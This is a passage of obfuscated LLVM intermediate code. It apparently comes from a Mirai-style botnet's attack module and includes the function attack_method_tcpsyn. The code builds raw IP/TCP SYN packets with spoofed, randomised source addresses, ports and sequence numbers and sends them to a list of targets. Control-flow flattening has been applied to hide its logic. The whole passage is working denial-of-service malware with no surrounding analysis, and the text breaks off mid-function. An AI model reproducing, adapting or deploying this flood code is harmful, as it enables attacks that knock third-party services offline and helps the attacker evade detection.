  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 1612862254, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 1260665600, i32 515928716
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 515928716, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 -399586658, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 -1094123961, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 1521721755, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -529941560, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -529941560, label %first
    i32 1745786632, label %99
    i32 -1325558674, label %100
    i32 2024495510, label %106
    i32 -1504140142, label %109
    i32 -1061347125, label %110
    i32 1769433161, label %116
    i32 2013590325, label %160
    i32 -1662497305, label %164
    i32 -2097661952, label %289
    i32 -1910147796, label %292
    i32 372847046, label %293
    i32 747507772, label %294
    i32 -1492155442, label %300
    i32 155988861, label %320
    i32 -288597719, label %341
    i32 1742629733, label %345
    i32 -1043386769, label %349
    i32 -2105519815, label %354
    i32 16127796, label %360
    i32 -1638887483, label %365
    i32 1337444932, label %371
    i32 1175476448, label %376
    i32 -1350121315, label %382
    i32 136912601, label %386
    i32 343859410, label %390
    i32 -1718609515, label %394
    i32 1848794256, label %398
    i32 1628643220, label %402
    i32 1435871756, label %408
    i32 -1186207103, label %446
    i32 592461549, label %449
    i32 338273370, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 1745786632, i32 -1325558674
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 338273370, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 2024495510, i32 -1504140142
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 338273370, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1061347125, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 1769433161, i32 -1910147796
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 2013590325, i32 -1662497305
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 -1662497305, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1458, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 8, i8* %287, align 1
  store i32 -2097661952, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 -1061347125, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 372847046, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 747507772, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 -1492155442, i32 592461549
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 155988861, i32 -288597719
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 -288597719, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 1742629733, i32 -1043386769
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -1043386769, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 -2105519815, i32 16127796
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 16127796, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 -1638887483, i32 1337444932
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 1337444932, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1175476448, i32 -1350121315
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 -1350121315, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 136912601, i32 343859410
  store i32 %385, i32* %switchVar
